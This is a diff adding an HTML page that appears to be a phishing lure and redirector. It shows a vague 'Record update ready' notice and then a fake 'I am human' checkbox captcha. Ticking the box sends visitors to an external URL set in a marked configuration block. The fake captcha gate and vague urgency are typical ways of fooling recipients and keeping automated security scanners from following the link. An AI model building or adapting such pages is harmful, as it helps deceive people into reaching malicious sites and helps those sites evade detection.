@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verify to continue</title>
+  <style>
+    * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
+    body {
+      margin: 0; padding: 0;
+      font-family: 'Segoe UI', Arial, Helvetica, sans-serif;
+      background: linear-gradient(135deg, #f4f6f9 0%, #e5e7eb 100%);
+      display: flex; justify-content: center; align-items: center;
+      min-height: 100vh;
+    }
+    .card {
+      background: #ffffff;
+      border-radius: 10px;
+      padding: 44px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      max-width: 480px;
+      width: 92%;
+      text-align: center;
+    }
+    .logo {
+      max-height: 56px;
+      margin-bottom: 18px;
+    }
+    h1 {
+      font-size: 22px;
+      font-weight: 600;
+      margin: 0 0 12px 0;
+      color: #111827;
+    }
+    p {
+      margin: 0 0 24px 0;
+      color: #374151;
+      line-height: 1.6;
+    }
+    .btn {
+      background-color: #1e40af;
+      color: #ffffff;
+      border: none;
+      padding: 12px 28px;
+      font-size: 15px;
+      font-weight: 600;
+      border-radius: 6px;
+      cursor: pointer;
+      display: inline-block;
+      text-decoration: none;
+    }
+    .btn:hover { background-color: #1e3a8a; }
+    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+    .captcha-box {
+      margin-top: 18px;
+      padding: 18px;
+      background: #f8fafc;
+      border: 1px solid #e5e7eb;
+      border-radius: 8px;
+      display: none;
+    }
+    .checkbox-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 14px;
+    }
+    .checkbox-row input[type=\"checkbox\"] {
+      width: 20px; height: 20px; accent-color: #1e40af;
+    }
+    .checkbox-row label {
+      font-size: 15px; color: #111827; font-weight: 500;
+      cursor: pointer;
+    }
+    .error { color: #dc2626; font-size: 13px; margin-top: 8px; display: none; }
+    .footer {
+      margin-top: 22px;
+      font-size: 12px;
+      color: #6b7280;
+    }
+    .footer a { color: #1e40af; text-decoration: none; }
+  </style>
+</head>
+<body>
+  <div class="card">
+
+    <div id="step-start">
+      <h1>Record update ready</h1>
+      <p>Your file has a new status that requires review. <br>Click below to open your secure record update.</p>
+      <button class="btn" onclick="showCaptcha()">Click here to view</button>
+    </div>
+
+    <div class="captcha-box" id="step-captcha">
+      <div class="checkbox-row">
+        <input type="checkbox" id="human-check">
+        <label for="human-check">I am human</label>
+      </div>
+      <button class="btn" id="continue-btn" disabled onclick="checkCaptcha()">Continue</button>
+      <div class="error" id="captcha-error">Please confirm you are human to continue.</div>
+    </div>
+  </div>
+
+  <script>
+    // === CONFIGURATION ===
+    const REDIRECT_URL = 'http://departmentallaw.com/';
+    // =====================
+
+    function showCaptcha() {
+      document.getElementById('step-start').style.display = 'none';
+      document.getElementById('step-captcha').style.display = 'block';
+      document.getElementById('human-check').checked = false;
+      document.getElementById('continue-btn').disabled = true;
+      document.getElementById('captcha-error').style.display = 'none';
+    }
+
+    function checkCaptcha() {
+      const checked = document.getElementById('human-check').checked;
+      if (checked) {
+        window.location.href = REDIRECT_URL;
+      } else {
+        document.getElementById('captcha-error').style.display = 'block';
+      }
+    }
+
+    document.getElementById('human-check').addEventListener('change', function() {
+      document.getElementById('continue-btn').disabled = !this.checked;
+      document.getElementById('captcha-error').style.display = 'none';
+    });
+  </script>
+</body>
+</html>
